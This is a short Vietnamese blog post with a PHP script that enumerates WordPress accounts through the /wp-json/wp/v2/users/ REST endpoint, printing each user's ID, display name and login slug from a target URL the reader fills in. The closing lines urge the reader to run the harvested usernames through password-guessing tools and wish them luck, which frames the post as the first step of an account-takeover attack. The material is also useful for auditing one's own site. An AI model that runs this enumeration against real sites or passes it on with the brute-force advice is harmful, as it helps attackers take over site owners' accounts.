---
title: Tiết lộ Người dùng WordPress
date: 23/06/2021
layout: single
--- 


# Mô Tả 
Tiết lộ các tài khoản WordPress thông qua `/wp-json/wp/v2/users/` sử dụng php để dump tên tài khoản, và họ tên đăng bài 



## Hướng dẫn
Thay đổi url trong đoạn code dưới đây 
```shell 
php file.php
```
[![Language](https://img.shields.io/badge/Lang-php-blue.svg)](https://www.php.net/  )
```php
#!usr/bin/php
<?php
header ('Content-type: text/html; charset=UTF-8');


$url= "http://tagert"; # url 
$payload="/wp-json/wp/v2/users/";
$urli = file_get_contents($url.$payload);
$json = json_decode($urli, true);
if($json){
    echo "*-----------------------------*\n";
foreach($json as $users){
    echo "[*] ID :  |" .$users['id']     ."|\n";
    echo "[*] Name: |" .$users['name']   ."|\n";
    echo "[*] User :|" .$users['slug']   ."|\n";
    echo "\n";
}echo "*-----------------------------*";} 
else{echo "[*] No user";}


?>

```

![](/assets/images/10.PNG)
###Có thể thấy User ID Name đã được dump ra :D
###Với tài khoản trên, bạn có thể sử dụng các công cụ dò mật khẩu để truy ra nó :D

## Chúc may mắn :D

